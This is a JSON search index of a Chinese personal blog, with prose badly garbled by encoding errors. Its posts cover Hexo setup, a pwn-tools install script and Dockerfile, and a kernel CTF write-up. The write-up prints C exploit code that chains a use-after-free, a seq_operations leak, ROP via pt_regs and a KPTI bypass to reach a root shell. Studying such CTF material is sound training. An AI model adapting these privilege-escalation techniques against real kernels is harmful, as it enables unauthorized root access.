{"posts":[{"title":"init-blog","text":"æ­å»ºåšå®¢ç¯å¢ƒ github + hexo hexoä½¿ç”¨ hexo å‘½ä»¤æŠ¥é”™ï¼Œä¸Šç½‘æŸ¥ï¼Œä½¿ç”¨ npx hexo æ’ä»¶ä¸‹è½½ 1npm install --save hexo-deployer-git å¸¸ç”¨å‘½ä»¤ 12345678npx hexo init # åˆå§‹åŒ–ä¸€ä¸ªä»“åº“npx hexo cleannpx hexo g # é™æ€ç•Œé¢ç”Ÿæˆnpx hexo s # æœ¬åœ°å¯åŠ¨ servicenpx hexo d # æ’ä»¶ã€‚ä¼ åˆ°githubnpx hexo new page &lt;name&gt; # ç”Ÿæˆç›®å½•npx hexo new &lt;name&gt;.md #ç”Ÿæˆæ–‡ç«  å¸¸ç”¨å±æ€§ 123456title: æ ‡é¢˜ï¼Œ ä½¿ç”¨ {{title}}date: æ—¥æœŸ, ä½¿ç”¨ {{date}}updated: æ›´æ–°tags: æ ‡ç­¾categories: åˆ†ç±»comments: å¼€å¯è¯„è®º true æœ¬åœ° obsidian å†™md vscode æ›´æ¢ä¸»é¢˜ ç®€çº¦çš„ä¸»é¢˜ https://hexo.io/themes/index.html ç½‘ç«™ ä¸ªäººå–œæ¬¢å¦‚ä¸‹çš„ä¸»é¢˜ freemind.bithack next cactus icarus icarus theme é…ç½® æœ€ç»ˆé€‰æ‹©äº†è¿™ä¸ª å®‰è£… 123npm install -S hexo-theme-icarus hexo-renderer-infernoorgit clone https://github.com/ppoffice/hexo-theme-icarus.git themes/icarus æ›´æ”¹ 1hexo config theme icarus é…ç½®: google + å®˜æ–¹æ–‡æ¡£ï¼Œé…ç½®è‡ªå·±å–œæ¬¢çš„åœ°æ–¹ æ’ä»¶ è¯„è®ºåŒºï¼Ÿ æŒç»­å­¦ä¹  ç®€å•ç‚¹ä¹Ÿè¿˜è¡Œï¼Œä¸æƒ³æŠ˜è…¾äº†ã€‚ å®˜ç½‘ + googleï¼Œæ»¡è¶³ä¸€åˆ‡è¦æ±‚ ä¸­æ–‡æ–‡æ¡£","link":"/2023/03/19/init-blog/"},{"title":"pwn init","text":"æ­å»ºä¸€ä¸ªpwnç¯å¢ƒã€‚ apt or apt-get? è™½ç„¶æˆ‘ä½¿ç”¨aptå‡ºç°warning,ä½†æ˜¯ä¾ç„¶èƒ½ç”¨ åœ¨è„šæœ¬ä¸­ï¼Œæ›´åŠ æ¨è apt-get -y yes é¿å…äº¤äº’è€Œäº§ç”Ÿé”™è¯¯ VM or WSL å®‰è£…å¿…å¤‡çš„åº”ç”¨ rootä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·æ— æ³•ä½¿ç”¨gdbæ’ä»¶åŠŸèƒ½ï¼Œå› ä¸ºgdbinitæ–‡ä»¶çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ä¸€ä»½åˆ°è‡ªå·±çš„ç”¨æˆ·ç›®å½•ä¸‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/bin/shcd ~apt-get update &amp;&amp; apt-get upgradeapt-get install -y patchelfapt-get install -y wgetapt-get install -y zipapt-get install -y tzdataapt-get install -y libncursesw5-dev libgdbm-dev libc6-dev opensslapt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \\ xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \\ vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \\ autoconf automake libtool make zsh openssh-server openssh-client \\ gdb-multiarch bison clang# pythonå·¥å…·python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr# pwntools# æ¢æºï¼Œå¯é€‰# pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simplepython3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools# ROPgadgetpython3 -m pip install ROPgadget# pwndbgcd ~git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh# pwngdbcd ~git clone https://github.com/scwuapt-getx/Pwngdb.git cat ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit# gemæºgem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/# seccomp-toolsgem install seccomp-tools# one_gadgetgem install one_gadget# pwninitapt-get install liblzma-dev pkgconfapt-get install cargocargo install pwninit# docker è‡ªå·±é€‰æ‹©# apt-get install docker.io# qemu è‡ªå·±é€‰æ‹©# apt-get install qemu qemu-system qemu-user-static binfmt-support Docker æ­å»ºæ›´åŠ å®¹æ˜“ ç”±äºæŸäº›é¢˜ç›®æ²¡æœ‰Libcç‰ˆæœ¬ï¼Œè€Œæ˜¯ç»™å‡ºäº†Dockerfileã€‚æˆ–è€…è¯´ï¼Œä¸æƒ³ä¸‹è½½è™šæ‹Ÿæœºã€‚ glibc-all-in-one ä¸‹è½½ä¸€ä¸ªlibc è¿›è¡Œpatch(ä½†æ˜¯patchelfå®¹æ˜“å¯¼è‡´ç¨‹åºç ´å). è‡ªå·±çš„dockerç¯å¢ƒ dockerç¯å¢ƒæ­å»º: æ›´æ”¹VERSIONå°±è¡Œï¼Œç¦æ­¢äº¤äº’ã€‚ 1234567891011121314151617181920ARG VERSION=20.04FROM ubuntu:$VERSIONARG DEBIAN_FRONTEND noninteractive # ENV TZ=Asia/Shanghai########## solve some error ############### å®šä¹‰æ—¶åŒºå‚æ•°ENV TZ=Asia/Shanghai# è®¾ç½®æ—¶åŒºRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo '$TZ' &gt; /etc/timezone# è®¾ç½®ç¼–ç ENV LANG C.UTF-8USER rootWORKDIR /rootCOPY ./pwninit.sh /rootRUN chmod +x /root/pwninit.sh &amp;&amp; /root/pwninit pwninit: åªéœ€è¦å®‰è£…éƒ¨åˆ†å·¥å…· 123456789101112131415161718192021222324252627#!/bin/shcd ~apt-get update &amp;&amp; apt-get upgradeapt-get install -y libncursesw5-dev libgdbm-dev libc6-dev opensslapt-get install -y python3 python3-pip python3-dev lib32z1 \\ curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \\ vim netcat iputils-ping cpio file net-tools locales \\ autoconf automake libtool make zsh openssh-server openssh-client \\ gdb-multiarch bison clang# otherspython3 -m pip install capstone filebytes unicorn keystone-engine ropper# pwntools# æ¢æºï¼Œå¯é€‰# pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simplepython3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools# ROPgadgetpython3 -m pip install ROPgadget# pwndbgcd ~git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh åˆ›å»ºä¸€ä¸ªå®¹å™¨ 1234docker build -h &lt;repo&gt;:&lt;tag&gt; .# -f æŒ‡å®šdockerfile# repo å½¢å¼ xxx/xxxdocker ps -a è¿›å…¥docker 12docker run -it ubuntu:VERSION /bin/bash# -v dir:dir å…±äº«æ–‡ä»¶å¤¹ docker å‘½ä»¤ -i: äº¤äº’å¼ -t: terminl -v hostDir:dockerDir å…±äº«æ–‡ä»¶å¤¹ ps -a: æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨ åœæ­¢åé‡æ–°è®¡å…¥å®¹å™¨ 12docker start &lt;ID&gt;docker attach &lt;ID&gt; åœæ­¢å®¹å™¨ 1docker stop &lt;ID&gt; åˆ é™¤å®¹å™¨ 1docker rm &lt;ID&gt; åˆ é™¤é•œåƒ 1docker rmi &lt;ID&gt; æŠ¥é”™å¤„ç† error 1 123456******Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.You might try launching gdb with: LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdbMake sure that en_US.UTF-8 is activated in /etc/locale.gen and you called locale-gen****** error 2 1234567891011Traceback (most recent call last): File &quot;/root/pwndbg/gdbinit.py&quot;, line 58, in &lt;module&gt; import pwndbg # noqa: F401 File &quot;/root/pwndbg/pwndbg/__init__.py&quot;, line 86, in &lt;module&gt; config_mod.init_params() File &quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;, line 159, in init_params Parameter(p) File &quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;, line 45, in __init__ self.value = param.valueUnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128)------- tip of the day (disable with set show-tips off) ------- å‡ºç°äº†å¦‚ä¸Šé”™è¯¯ã€‚å¯»æ‰¾åˆ°ä¸€ä¸ª(issue)[https://github.com/pwndbg/pwndbg/issues/1539] error1ï¼Œä¿®æ”¹dockerfileçš„ç±»ä¼¼å¦‚ä¸‹å˜é‡ã€‚é€‰æ‹©ä¸­å›½ error2 ä¹Ÿè§£å†³äº†ã€‚ 123456789# ENV LANG en_US.utf8# æˆ‘ä»¬çš„è®¾ç½®# å®šä¹‰æ—¶åŒºå‚æ•°ENV TZ=Asia/Shanghai# è®¾ç½®æ—¶åŒºRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo '$TZ' &gt; /etc/timezone# è®¾ç½®ç¼–ç ENV LANG C.UTF-8 docker-compose åˆ›å»ºå¤šä¸ªdockerã€‚","link":"/2023/06/05/Pwn%20init/"},{"title":"peekgeek mmsg","text":"åšé¢˜è¸©å‘å®å½•ï¼Œèµ›åå¤ç°. step1: init æ‹¿åˆ°é™„ä»¶ï¼ŒæŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œsmep, smap, kaslrï¼Œåº”è¯¥è¿˜æœ‰pti 12345678910111213#!/bin/bashqemu-system-x86_64 \\ -m 256M \\ -cpu host,+smep,+smap \\ -smp cores=1 \\ -kernel bzImage \\ -hda rootfs.img \\ -nographic \\ -monitor none \\ -snapshot \\ -enable-kvm \\ -append &quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init quiet oops=panic panic=1&quot; \\ -no-reboot ext4 é•œåƒæŒ‚è½½ 123mkdir rootfssudo mount rootfs.img ./rootfs æŸ¥çœ‹initï¼Œ etc/init.d ä¸‹çš„æ–‡ä»¶ 12345678910111213141516171819202122232425262728#!/bin/shchown -R root:root /chmod 700 /rootchown -R ctf:ctf /home/ctfchown root:root /root/flagchmod 600 /root/flagmount -t proc none /procmount -t sysfs none /sysmount -t tmpfs tmpfs /tmpmkdir /dev/ptsmount -t devpts devpts /dev/pts# echo 1 &gt; /proc/sys/kernel/dmesg_restrict# echo 1 &gt; /proc/sys/kernel/kptr_restrictinsmod /root/mmsg.kochmod 666 /dev/mmsgecho -e &quot;\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n&quot;cd /home/ctf# setsid cttyhack su ctf -c /bin/shsetsid cttyhack setuidgid 1000 /bin/sh# setsid cttyhack setuidgid 0 /bin/shpoweroff -d 0 -f ä¿®æ”¹å†…å®¹ï¼Œå°†koæ–‡ä»¶æ‹·è´ä¸€ä»½ï¼Œetc/init.d/rcSå†…å®¹ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åumountï¼Œå¯åŠ¨ã€‚ï¼ˆä¿®æ”¹æ•ˆæœç”Ÿæ•ˆå¿…é¡»è¦umountï¼‰ 1sudo mount ./rootfs å†…æ ¸ç‰ˆæœ¬ 5.10.186 step2: ko é€†å‘åˆ†ækoæ–‡ä»¶ï¼ˆç›´æ¥ç»™å‡ºäº†cæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸çœ‹ï¼‰ã€‚æ¼æ´æ‰€åœ¨çš„åœ°æ–¹ï¼Œç±»ä¼¼å…¥é—¨ç»å…¸é¢˜ç›®kernel UAF - CTF Wikiã€‚ä½†æ˜¯ç»“æ„ä½“å¤§å°0x20 123456789101112131415161718192021222324252627282930313233static struct mmsg_head *mmsg_head; ...static struct miscdevice mmsg_device;...static int module_close(struct inode *inode, struct file *file) { kfree(mmsg_head); return SUCCESS;}...static int __init mmsg_module_init(void) { mmsg_device.minor = MISC_DYNAMIC_MINOR; mmsg_device.name = DEVICE_NAME; mmsg_device.fops = &amp;module_fops; misc_register(&amp;mmsg_device); mmsg_head = kmalloc(sizeof(struct mmsg_head), GFP_KERNEL); strncpy(mmsg_head-&gt;description, DEVICE_NAME &quot;-mmsg_head&quot;, 15); INIT_LIST_HEAD(&amp;mmsg_head-&gt;list); printk(KERN_INFO &quot;Hello, World!\\n&quot;); return SUCCESS;}static void __exit mmsg_module_exit(void) { misc_deregister(&amp;mmsg_device); printk(KERN_INFO &quot;Goodbye, World!\\n&quot;);} step3: exploit å°è¯•ROPï¼Œä½†æ˜¯ä¸å¤ªä¼šğŸ¤¡ 1åŸæ–‡å†…å®¹ï¼š ã€ŒPWNã€å†…æ ¸ PWN é¢˜ç›®çš„ç¬¬ä¸€æ¬¡å°è¯• åƒï¼Œå¾ˆåƒå‘€ã€‚çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°åŠå…¶ç±»ä¼¼ï¼Œäºæ˜¯å°è¯•ä½¿ç”¨ç±»ä¼¼çš„expè¿›è¡Œåš è°ƒè¯•ï¼Œæ‰¾åœ°å€ï¼Œå…ˆå…³é—­kaslrï¼Œé€šè¿‡æ³„éœ²è·å¾—offset 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157/* * gcc exp.c -static -o exp */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/fs.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;int fd1, fd2;int seq_fd;size_t buf[4];char *dev_name = &quot;/dev/mmsg&quot;;// kernel base =&gt; cat /proc/kallsyms | grep startup_64size_t kernel_base;size_t kernel_offset;// nokalr kernel basesize_t nokaslr = 0xffffffff81000000;/* * cat /sys/module/mmsg/sections/.text * 0xffffffffc03f5000 */// close kaslr// grep prepare_kernel_cred /proc/kallsymssize_t prepare_kernel_cred = 0xffffffff9248d790;// grep commit_creds /proc/kallsymssize_t commit_creds = 0xffffffff9248d350;// grep swapgs_restore_regs_and_return_to_usermode /proc/kallsymssize_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff93000e30;// grep native_write_cr4 /proc/kallsymssize_t native_write_cr4 = 0xffffffffa8832250;// ropper// pop rdi; retsize_t pop_rdi_ret = 0xffffffff812274dd;// 0xffffffff82d63c0d: mov edi, eax; call rbx;// åœ¨ 64 ä½ç¯å¢ƒä¸‹ï¼Œç›®çš„å¯„å­˜å™¨è‹¥æ˜¯ 32 ä½ï¼Œåˆ™ä¼šå°†é«˜ 32 ä½æ¸…é›¶size_t mov_edi_eax_call_rbx = 0xffffffff82d63c0d;// 0xffffffff82e6f708: pop rbx; ret; size_t pop_rbx_ret = 0xffffffff82e6f708;struct mmsg_arg { unsigned long token; int top; int size; char *data;};void new() {}void delete() {}void recv_mmsg() {}void copy_mmsg() {}void put_mmsg(int fd, char *addr) { struct mmsg_arg arg; memset(&amp;arg, 0, sizeof(struct mmsg_arg)); arg.data = addr; ioctl(fd, 0x5555555, &amp;arg);}void get_mmsg(int fd) { struct mmsg_arg arg; memset(&amp;arg, 0, sizeof(struct mmsg_arg)); memset(buf, 0, sizeof(buf)); arg.data = (char *)buf; ioctl(fd, 0x6666666, &amp;arg);}void err_exit(char *msg){ printf(&quot;\\033[31m\\033[1m[x] Error at: \\033[0m%s\\n&quot;, msg); exit(EXIT_FAILURE);}uint64_t user_cs, user_ss, user_rflags, user_rsp;void save_status(){ asm( &quot;movq %%cs, %0;&quot; &quot;movq %%ss, %1;&quot; &quot;movq %%rsp, %3;&quot; &quot;pushfq;&quot; &quot;pop %2;&quot; : &quot;=r&quot;(user_cs),&quot;=r&quot;(user_ss),&quot;=r&quot;(user_rflags),&quot;=r&quot;(user_rsp) : : &quot;memory&quot; );}void get_shell(void){ if( getuid() ) { err_exit(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m&quot;); } puts(&quot;\\033[32m\\033[1m[+] Successful to get the root. \\033[0m&quot;); system(&quot;/bin/sh&quot;); exit(0);}int seq_open(){ int seq; if ( (seq=open(&quot;/proc/self/stat&quot;, O_RDONLY)) == -1) { err_exit(&quot;[x] seq open fail&quot;); } return seq;}void uaf() { fd1 = open(dev_name, O_RDWR); if (fd1 &lt; 0) { err_exit(&quot;[x] open device 1&quot;); } fd2 = open(dev_name, O_RDWR); if (fd2 &lt; 0) { err_exit(&quot;[x] open device 2&quot;); } close(fd1);}void leak_base() { // read æ“ä½œï¼Œç»è¿‡å‡½æ•°è°ƒç”¨é“¾åˆ™ä¼šæœ€ç»ˆè°ƒç”¨ seq_operations-&gt;start æŒ‡é’ˆå¯¹åº”çš„å‡½æ•° seq_fd = seq_open(); get_mmsg(fd2); for (int j = 0; j &lt; 4; j++) { printf(&quot;buf[%d] =&gt; 0x%llx\\n&quot;, j, buf[j]); } kernel_base = buf[0] - 0x20fac0; printf(&quot;kernel base =&gt; 0x%llx&quot;, kernel_base); kernel_offset = kernel_base - nokaslr;}int main() { save_status(); uaf(); leak_base();} rop 12345678910111213141516171819202122232425262728293031// ä¹‹å‰çš„éƒ½ä¸€æ ·#if 1 #define o(x) (x+kernel_offset)#endif // smep userspaceåœ°å€è¢«æ ‡è®°ä¸ºnon-executable // bypass: stack prviot size_t payload[0x40]; int idx=0; size_t user_rip = (size_t)get_shell; payload[idx++] = o(pop_rbx_ret); payload[idx++] = o(commit_creds); payload[idx++] = o(pop_rdi_ret); // return address payload[idx++] = 0x0; payload[idx++] = o(prepare_kernel_cred); payload[idx++] = o(mov_edi_eax_call_rbx); payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + 22; payload[idx++] = 0x0; payload[idx++] = 0x0; payload[idx++] = user_rip; payload[idx++] = user_cs; payload[idx++] = user_rflags; payload[idx++] = user_rsp; payload[idx++] = user_ss; put_mmsg(fd2, (char *)&amp;payload); // trigger seq_file-&gt;start read(seq_fd, NULL, 1);} ä½¿ç”¨xchg è¿›è¡Œç±»ä¼¼æ ˆè¿ç§»çš„æ“ä½œï¼Œä»è€Œè¿›è¡ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµ åœ¨æœ¬åœ°æ‰§è¡Œæ—¶ï¼Œç›´æ¥kernel panicã€‚æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯can't access memory in 0x????(æ˜¯ä¸ªç”¨æˆ·åœ°å€)ã€‚ 2åæ¥çœ‹æ¥ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å‘ç°åŸå› ï¼šKernel Pwn Struct seq_operations and Struct pt_regs è¿™ä¸€é¢˜å¼€å¯äº†smapï¼Œè€Œ pwnhub çš„é‚£ä¸€é¢˜ä¸­æ²¡æœ‰ã€‚è€Œsmap: kernel space ä¸èƒ½ access user space çš„ä¸œè¥¿ã€‚ è¿™ç¯‡æ–‡ç« ä¸­è¯´äº†ä¸€ä¸ª pt_regs çš„ç»“æ„ä½“ï¼Œåœ¨ä½¿ç”¨syscall æ—¶ï¼Œä¼šå°†æŸäº›å¯„å­˜å™¨å†…å®¹å‹å…¥å†…æ ¸æ ˆçš„æ ˆåº•.12345678910111213141516171819202122232425262728293031323334struct pt_regs {/* * C ABI says these regs are callee-preserved. They aren't saved on kernel entry * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;. */ unsigned long r15; unsigned long r14; unsigned long r13; unsigned long r12; unsigned long rbp; unsigned long rbx;/* These regs are callee-clobbered. Always saved on kernel entry. */ unsigned long r11; unsigned long r10; unsigned long r9; unsigned long r8; unsigned long rax; unsigned long rcx; unsigned long rdx; unsigned long rsi; unsigned long rdi;/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */ unsigned long orig_rax;/* Return frame for iretq */ unsigned long rip; unsigned long cs; unsigned long eflags; unsigned long rsp; unsigned long ss;/* top of stack page */}; åœ¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ä¸­, ä¸æ˜¯æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½ä¼šè¢«æ”¹å˜, æ¯”å¦‚ r8 - r15, ä»–ä»¬ä¼šåœ¨å‹å…¥ pt_regs çš„æ—¶ä¿æŒ syscall ä¹‹å‰çš„å€¼. è¿™å°±ä¸ºæˆ‘ä»¬æä¾›äº†å¸ƒç½®æ•°æ®çš„å¯èƒ½æ€§. å¦‚æœåœ¨ä»…èƒ½åŠ«æŒ rip çš„æƒ…å†µä¸‹ (æ¯”å¦‚ä¸Šé¢ä»‹ç»çš„ seq_operations), è·³è½¬åˆ°æŸä¸ªå½¢å¦‚ add, rsp val; ret çš„ gadget, é‚£ä¹ˆå°±æœ‰å¯èƒ½å°† rsp è®¾ç½®åˆ°å†…æ ¸æ ˆçš„ pt_regs ä¸Š, ä»è€Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®çš„ ROP é“¾. ä¹Ÿå°±æ˜¯æˆ‘ä»¬ rop å¾€ å†…æ ¸æ ˆçš„ pt_regs ä¸­è·³è½¬ï¼Œå°±ä¸ä¼šç»•è¿‡äº†smap å¦‚ä½•å°†å¯„å­˜å™¨å‹å…¥: ä½¿ç”¨äº†å·§å¦™åœ°æ–¹æ³•ï¼Œsyscall è°ƒç”¨ readï¼Œå°†å¯„å­˜å™¨å‹å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡seq_operations-&gt;startæ‰§è¡Œrop è°ƒç”¨æ¨¡æ¿+è§£é‡Šçš„æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« ï¼šseq_operations+pt_regs 123456789101112131415161718__asm__( &quot;mov r15, 0x55555555;&quot; &quot;mov r14, 0x44444444;&quot; &quot;mov r13, 0x33333333;&quot; &quot;mov r12, 0x22222222;&quot; &quot;mov rbp, 0xbbbb1111;&quot; &quot;mov rbx, 0xbbbb2222;&quot; &quot;mov r11, 0x11111111;&quot; &quot;mov r10, 0x11110000;&quot; &quot;mov r9, 0x99999999;&quot; &quot;mov r8, 0x88888888;&quot; &quot;xor rax, rax;&quot; &quot;mov rcx, 0x666666;&quot; &quot;mov rdx, 8;&quot; &quot;mov rsi, rsp;&quot; &quot;mov rdi, seq_fd;&quot; &quot;syscall&quot; ); gadget: æ”¹å˜rsp, add rsp, xxx; retï¼Œè¿›è¡Œæ ˆè¿ç§» 123pwndbg&gt; x/2wi 0xffffffff81909b8c 0xffffffff81909b8c: add rsp,0x168 0xffffffff81909b93: ret ä½†æ˜¯æˆ‘ä»¬éœ€è¦äº‹å…ˆçŸ¥é“æ‰§è¡Œstart æ—¶ä¸pt_regs è·ç¦»å¤šè¿œã€‚ ç›´æ¥ä½¿ç”¨æ²¡æœ‰å¸ƒå±€çš„è„šæœ¬ï¼Œè‡ªç„¶ä¼škernel panicï¼Œå¯ä»¥çœ‹åˆ°ripçš„å†…å®¹ï¼Œç„¶åä¸ä¸Šè¿°çš„payloadè¿›è¡Œå¯¹æ¯”ï¼Œè·å¾—åç§» å¹¶ä¸”è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªä¸‡èƒ½çš„æ–¹æ³• 3 åæ¥è¿˜æ˜¯ä¸å¯¹ï¼Œå› æ­¤å†çœ‹å‚è€ƒæ–‡ç« ï¼Œå¦‚ä¸‹ä¹Ÿå­˜åœ¨uafé—®é¢˜ã€‚123456789101112131415161718192021// module_ioctlstruct mmsg_head { char description[16]; struct list_head list;};case MMSG_RECV: if (arg.top) { m = list_entry(&amp;mmsg_head-&gt;list, struct mmsg, list); // head } else { m = find_mmsg(arg.token); // éå†æŸ¥è¯¢ } if (m == NULL || arg.size &gt; m-&gt;size || arg.size &lt;= 0) { ret = -EINVAL; break; } printk(KERN_INFO &quot;mmsg recv\\n&quot;); copy_to_user((void __user *)arg.data, m-&gt;data, arg.size); list_del(&amp;m-&gt;list); // åŒå‘é“¾è¡¨å…ƒç´ å†…æ ¸æä¾›çš„åˆ é™¤å‡½æ•° kfree(m-&gt;data); // head æ²¡æœ‰ï¼Œä½†æ˜¯å›ºå®šåç§»ä¸º 0x10 çš„åœ°æ–¹ï¼Œç›¸å½“äºfreeæ‰listï¼Œä¸ä¼šæŠ¥é”™ kfree(m); break; 4åç§»ç¡®å®š add rsp valï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¯”è¾ƒå…·ä½“çš„å€¼ å¤§æ¦‚æ˜¯ 0x100+ çš„gadgetå§ï¼Œä¸å¤ªä¼šï¼Œä½†æ˜¯æ­¤ç»“æ„ä½“å¤§å°å¤§äº0x100ï¼Œå¹¶ä¸”è¦å¼€å¯syscallçš„æ ˆå¸§ åº”è¯¥å¯ä»¥åœ¨ioctl ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯æˆ‘å¤±è´¥äº†ğŸ˜¥ æ‰§è¡Œæµç¨‹ ç›´æ¥çœ‹æŠ¥é”™: BUG: unable to handle page fault for address: 0000000044444444 ï¼› RIP: 0010:0x44444444è·å¾—æˆ‘ä»¬ripæŒ‡é’ˆæ§åˆ¶çš„å¯„å­˜å™¨ r14 syscall ä¸ä¼šæ”¹å˜ r8-r15å†…å®¹ã€‚ç†æƒ³æƒ…å†µä¸‹r8-r15å†…å®¹ä¸å˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šäº§ç”Ÿå¥‡å¦™çš„å˜åŒ–ã€‚è°ƒè¯•ï¼Œsiä¼šèµ°åˆ°startæŒ‡é’ˆçš„æ“ä½œï¼Œä»è€Œè·å¾—æ ˆç»“æ„ å‡è®¾ç†æƒ³åŒ–ä»r14-r8æ²¡æœ‰å‘ç”Ÿæ”¹å˜ si ä¸€è·¯èµ°ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å¯¹åº”å†…å®¹? KERNEL_PWNçŠ¶æ€åˆ‡æ¢åŸç†åŠKPTIç»•è¿‡ swapgs; iretq è¿”å›ç”¨æˆ·æ€; ret rip,åœ¨æ­¤å¤„æ²¡æœ‰ä½¿ç”¨retæŒ‡ä»¤ï¼Œç›´æ¥iretq, ç›´æ¥r9ä¸ºuser_rspå°±è¡Œ 1234567swapgs iretq rsp ---&gt; rip cs rflags rsp ss swapgs_restore_regs_and_return_to_usermode: è¿™ä¸ªæ¯”ä¸Šä¸ªå¤æ‚ä¸€ç‚¹ï¼Œéœ€è¦åœ¨è¿ç§»ä¸€æ¬¡ 12345678swapgs_restore_regs_and_return_to_usermode + 22 0 // padding 0 // padding get_shelluser_cs user_rflags user_spuser_ss errors qemu cpuä¸º host ä¹Ÿå¿…é¡»å¼€å¯kvm, åŒæ—¶å°±æ˜¯è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´æˆ‘ä¸€ç›´ä¸æˆåŠŸï¼Œåæ¥å»é™¤æ‰kvmå°†cpuæ”¹ä¸ºkvm64æˆåŠŸã€‚åº”è¯¥æ˜¯æœ¬æœºçš„CPUçš„å®‰å…¨é˜²æŠ¤å¯¼è‡´ä¸€ç›´å¤±è´¥ğŸ˜¥ã€‚ exploit signal bypass kptiã€‚æ‰§è¡Œç”¨æˆ·æ€çš„ä»»æ„ä»£ç éƒ½ä¼šæŠ¥å‡ºä¿¡å·SIGSEGVï¼Œé‚£ä¹ˆåœ¨ç¨‹åºå¼€å§‹æ—¶å°†SIGSEGVä¸shellå‡½æ•°ç»‘å®šåœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆè®¿é—®ç”¨æˆ·æ€ä»£ç æ—¶å°±ä¼šæŠ¥å‡ºä¿¡å·SIGSEGVï¼Œå°±ä¼šæ‰§è¡Œä¿¡å·å‡½æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#define COLOR_GREEN &quot;\\033[32m&quot;#define COLOR_RED &quot;\\033[31m&quot;#define COLOR_YELLOW &quot;\\033[33m&quot;#define COLOR_DEFAULT &quot;\\033[0m&quot;#define log_debug(fmt, ...) \\ dprintf(2, &quot;[*] %s:%d &quot; fmt &quot;\\n&quot;, __FILE__, __LINE__, ##__VA_ARGS__)#define log_info(fmt, ...) \\ dprintf(2, COLOR_GREEN &quot;[+] %s:%d &quot; fmt &quot;\\n&quot; COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__)#define log_warning(fmt, ...) \\ dprintf(2, COLOR_YELLOW &quot;[!] %s:%d &quot; fmt &quot;\\n&quot; COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__)#define log_error(fmt, ...) \\ dprintf(2, COLOR_RED &quot;[-] %s:%d &quot; fmt &quot;\\n&quot; COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__)#define die(fmt, ...) \\ do { \\ log_error(fmt, ##__VA_ARGS__); \\ log_error(&quot;Exit at line %d&quot;, __LINE__); \\ exit(1); \\ } while (0)void get_shell(){ if( getuid() ) { die(&quot;fail to get shell&quot;); } log_info(&quot;start to get root shell&quot;); system(&quot;/bin/sh&quot;); 